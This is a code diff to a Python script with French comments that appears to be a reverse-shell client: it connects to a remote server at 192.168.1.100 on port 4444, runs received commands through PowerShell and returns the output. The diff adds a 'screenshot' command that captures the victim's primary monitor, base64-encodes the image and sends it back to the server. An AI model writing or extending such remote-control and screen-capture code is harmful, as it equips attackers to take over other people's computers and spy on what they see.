@@ -2,6 +2,7 @@ import socket
 import subprocess
 import os
 import sys
+import base64
 
 SERVER_IP = "192.168.1.100"
 SERVER_PORT = 4444
@@ -40,11 +41,24 @@ def main():
         if commande == "exit":
             break
 
-        # on execute et on renvoie le resultat
-        resultat = execute_cmd(commande)
-        sock.send(resultat.encode())
+        elif commande == "screenshot":
+            resultat = take_screenshot()
+            sock.sendall(resultat.encode())
+
+        else:
+            resultat = execute_cmd(commande)
+            sock.send(resultat.encode())
 
     sock.close()
+
+
+# prend un screenshot et le renvoie encode en base64
+def take_screenshot():
+    import mss
+    with mss.mss() as sct:
+        img = sct.grab(sct.monitors[1])
+        png = mss.tools.to_png(img.rgb, img.size)
+        return base64.b64encode(png).decode()
 
 
 # execute une commande powershell et renvoie la sortie
